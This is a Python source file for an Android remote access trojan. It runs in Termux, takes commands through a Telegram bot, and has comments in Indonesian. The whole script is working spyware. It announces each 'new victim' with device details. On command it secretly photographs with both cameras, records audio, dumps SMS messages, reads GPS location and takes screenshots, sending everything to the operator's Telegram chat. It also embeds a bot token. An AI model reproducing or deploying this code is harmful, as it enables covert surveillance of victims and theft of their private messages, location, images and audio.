import os, sys, json, requests, subprocess, threading, time, telebot
from datetime import datetime

TOKEN = "8283668164:AAFBRMnVLlBWk1Fwll-XXPwT8HMujW5EeUo"
CHAT_ID = "7924673692"
SERVER_URL = "https://telegram-rat-bot.username.repl.co"  # Ganti dengan URL Replit

bot = telebot.TeleBot(TOKEN)

def setup_termux():
    """Setup awal di Termux"""
    commands = [
        "pkg update -y",
        "pkg upgrade -y",
        "pkg install python -y",
        "pkg install termux-api -y",
        "pkg install curl -y",
        "pkg install wget -y",
        "termux-setup-storage",
        "pip install telebot requests",
    ]
    
    for cmd in commands:
        try:
            os.system(cmd)
        except:
            pass

def capture_camera():
    """Jepret kamera depan & belakang"""
    for cam_id in [0, 1]:
        try:
            filename = f"cam_{cam_id}_{int(time.time())}.jpg"
            os.system(f"termux-camera-photo -c {cam_id} {filename}")
            if os.path.exists(filename):
                with open(filename, 'rb') as photo:
                    bot.send_photo(CHAT_ID, photo, caption=f"📸 Camera {cam_id}")
                os.remove(filename)
        except:
            pass

def record_audio(duration=10):
    """Rekam audio"""
    try:
        filename = f"audio_{int(time.time())}.aac"
        os.system(f"termux-microphone-record -l {duration} {filename}")
        if os.path.exists(filename):
            with open(filename, 'rb') as audio:
                bot.send_audio(CHAT_ID, audio, caption="🎤 Audio Recording")
            os.remove(filename)
    except:
        pass

def get_sms():
    """Ambil SMS"""
    try:
        filename = f"sms_{int(time.time())}.txt"
        os.system(f"termux-sms-list -l 20 > {filename}")
        if os.path.exists(filename):
            with open(filename, 'rb') as file:
                bot.send_document(CHAT_ID, file, caption="📱 SMS Logs")
            os.remove(filename)
    except:
        pass

def get_location():
    """Ambil lokasi GPS"""
    try:
        filename = f"location_{int(time.time())}.txt"
        os.system(f"termux-location > {filename}")
        if os.path.exists(filename):
            with open(filename, 'rb') as file:
                bot.send_document(CHAT_ID, file, caption="📍 Location")
            os.remove(filename)
    except:
        pass

def screenshot():
    """Ambil screenshot"""
    try:
        filename = f"screen_{int(time.time())}.png"
        os.system(f"screencap -p {filename}")
        if os.path.exists(filename):
            with open(filename, 'rb') as photo:
                bot.send_photo(CHAT_ID, photo, caption="🖥️ Screenshot")
            os.remove(filename)
    except:
        pass

def report_victim():
    """Laporkan korban baru"""
    try:
        # Ambil info device
        os.system("termux-info > device.txt")
        with open("device.txt", "r") as f:
            device_info = f.read()
        
        # Kirim ke bot
        bot.send_message(CHAT_ID, f"🎯 NEW VICTIM CONNECTED\n\n{device_info}")
        os.remove("device.txt")
    except:
        bot.send_message(CHAT_ID, "🎯 New victim connected!")

def message_handler():
    """Handle perintah dari bot"""
    @bot.message_handler(func=lambda message: True)
    def handle_all(message):
        if message.from_user.id == int(CHAT_ID):
            text = message.text
            
            if text == "EXEC:cam":
                capture_camera()
            elif text == "EXEC:audio":
                record_audio()
            elif text == "EXEC:sms":
                get_sms()
            elif text == "EXEC:loc":
                get_location()
            elif text == "EXEC:screen":
                screenshot()
            elif text == "PING":
                bot.reply_to(message, "✅ Alive")
    
    print("🔄 Listening for commands...")
    bot.polling()

def main():
    """Main function"""
    print("🔧 Setting up...")
    setup_termux()
    
    print("📞 Reporting to master...")
    report_victim()
    
    print("🎯 Backdoor activated!")
    print("📱 Victim ID:", CHAT_ID)
    
    # Jalankan message handler
    message_handler()

if __name__ == "__main__":
    main()
